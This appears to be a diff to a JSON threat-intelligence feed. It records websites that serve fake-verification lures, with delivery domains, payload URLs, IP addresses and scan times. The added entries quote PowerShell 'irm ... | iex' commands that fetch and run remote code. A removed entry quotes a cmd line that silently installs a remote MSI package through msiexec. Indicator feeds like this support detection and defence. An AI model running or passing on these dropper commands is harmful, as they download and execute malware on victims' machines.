@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "i-mill.net",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b46abcf84e5ae26d"
+    ],
+    "IP": [
+      "217.116.198.154"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b46abcf84e5ae26d')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b46abcf84e5ae26d"
+    ],
+    "ReportId": "cmwodzv5l1z250omlqi1hs6dh",
+    "ScannedAt": "2026-11-20T02:55:41.245000+00:00"
+  },
+  {
+    "UrlDomain": "www.portaleimmigrazioneconfial.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4e60a6dcbd4a3cbb"
+    ],
+    "IP": [
+      "89.46.108.46"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/4e60a6dcbd4a3cbb')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/4e60a6dcbd4a3cbb"
+    ],
+    "ReportId": "cmwodzfal1z0v0omlds2tteaj",
+    "ScannedAt": "2026-11-20T02:55:20.673000+00:00"
+  },
+  {
     "UrlDomain": "thelilypadlearningcenter.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -12908,27 +12946,5 @@
     ],
     "ReportId": "cmwczsy7h0fjp0omltp7h00pn",
     "ScannedAt": "2026-11-12T03:32:54.965000+00:00"
-  },
-  {
-    "UrlDomain": "darkiemods.rf.gd",
-    "DeliveryUrl": [
-      "xedplay.com",
-      "distnode.biz"
-    ],
-    "PayloadUrl": [
-      "https://xedplay.com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6",
-      "https://distnode.biz/radar-cover-probe/named"
-    ],
-    "IP": [
-      "185.27.134.33"
-    ],
-    "Related": [],
-    "Payload": "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\"",
-    "ResolvedDownloadUrl": [
-      "https://xedplay.com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6",
-      "https://distnode.biz/radar-cover-probe/named"
-    ],
-    "ReportId": "cmwcylu3c0fav0oml4xhetl84",
-    "ScannedAt": "2026-11-12T02:59:24.496000+00:00"
   }
 ]
